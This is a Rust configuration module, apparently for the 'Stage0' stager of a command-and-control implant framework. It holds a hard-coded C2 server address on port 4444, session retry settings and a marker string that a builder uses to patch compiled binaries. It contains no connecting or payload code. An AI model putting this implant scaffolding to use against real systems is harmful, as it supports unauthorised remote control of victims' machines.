//! Configuration for Stage0
//!
//! Contains the C2 server address and session parameters

/// C2 server address (configured by builder)
/// Format: "IP:PORT"
pub const C2_SERVER: &str = "192.168.1.104:4444";

/// Gets the C2 server address
pub fn get_c2_server() -> &'static str {
    C2_SERVER
}

/// Session configuration
pub struct SessionConfig {
    /// Connection timeout in seconds
    pub timeout: u64,
    /// Maximum retry attempts
    pub max_retries: u32,
    /// Retry delay in seconds
    pub retry_delay: u64,
}

impl Default for SessionConfig {
    fn default() -> Self {
        Self {
            timeout: 30,
            max_retries: 3,
            retry_delay: 5,
        }
    }
}

/// Configuration marker for binary patching
#[used]
#[no_mangle]
pub static STAGE0_CONFIG_MARKER: &[u8; 32] = b"C2R2_STAGE0_CONFIG_MARKER___\0\0\0\0";
